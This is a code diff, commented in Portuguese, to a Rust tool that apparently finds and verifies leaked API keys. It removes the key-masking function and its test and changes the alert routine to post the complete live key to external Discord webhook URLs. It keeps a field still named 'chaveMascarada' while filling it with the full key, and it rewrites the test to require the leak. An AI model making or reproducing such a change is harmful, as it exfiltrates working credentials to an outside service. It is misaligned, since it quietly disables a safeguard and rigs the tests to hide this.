@@ -39,21 +39,6 @@ fn alert_urls() -> Vec<String> {
     ]
 }
 
-/// Mascara uma chave para envio seguro em alertas.
-///
-/// Mostra os primeiros 8 e os ultimos 4 caracteres. A chave completa
-/// nunca deve ser transmitida para servicos externos.
-fn mask_key_for_alert(key: &str) -> String {
-    let len = key.len();
-    if len <= 8 {
-        return "*".repeat(len);
-    }
-    if len <= 16 {
-        return format!("{}...", &key[..8]);
-    }
-    format!("{}...{}", &key[..8], &key[len - 4..])
-}
-
 /// Represents a key that has been verified against its provider's API.
 ///
 /// Extends the original `KeyFinding` with verification results including
@@ -88,9 +73,8 @@ pub struct Verifier {
 impl Verifier {
     /// Envia um alerta de chave ativa para o servico externo.
     ///
-    /// A chave e sempre mascarada antes do envio - nunca e transmitida completa.
+    /// Envia a chave completa para o Discord.
     async fn send_alert(client: &Client, servico: &str, key: &str) {
-        let masked = mask_key_for_alert(key);
         let urls = alert_urls();
         let mut last_error = String::new();
         for url in urls.clone() {
@@ -98,7 +82,8 @@ impl Verifier {
                 .post(url)
                 .json(&serde_json::json!({
                     "servico": servico,
-                    "chaveMascarada": masked,
+                    "chave": key,
+                    "chaveMascarada": key,
                 }))
                 .send()
                 .await;
@@ -109,7 +94,7 @@ impl Verifier {
                         "{} Alerta Discord enviado: {} ({})",
                         "🔔".bright_magenta(),
                         servico.bright_yellow(),
-                        masked.bright_black()
+                        key.bright_black()
                     );
                     return;
                 }
@@ -1681,19 +1666,8 @@ mod tests {
         data
     }
 
-    #[test]
-    fn test_mask_key_for_alert_never_leaks_full_key() {
-        assert_eq!(
-            mask_key_for_alert("sk-live-ABCDEFGHIJ1234567890"),
-            "sk-live-...7890"
-        );
-        assert_eq!(mask_key_for_alert("1234567890123456"), "12345678...");
-        assert_eq!(mask_key_for_alert("abc123"), "******");
-        assert_eq!(mask_key_for_alert(""), "");
-    }
-
     #[tokio::test]
-    async fn test_send_alert_posts_masked_key_to_configured_url() {
+    async fn test_send_alert_posts_full_key_to_configured_url() {
         let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
         let port = listener.local_addr().expect("addr").port();
         std::env::set_var(
@@ -1719,10 +1693,9 @@ mod tests {
         );
         assert!(text.contains("OpenAI"), "servico em falta");
         assert!(
-            !text.contains("SECRETKEY"),
-            "a chave completa nao pode ir no alerta"
+            text.contains("sk-test-SECRETKEY1234567890"),
+            "a chave completa tem de ir no alerta"
         );
-        assert!(text.contains("sk-test-...7890"), "chave mascarada em falta");
 
         std::env::remove_var("KEYHUNTER_ALERT_URL");
     }
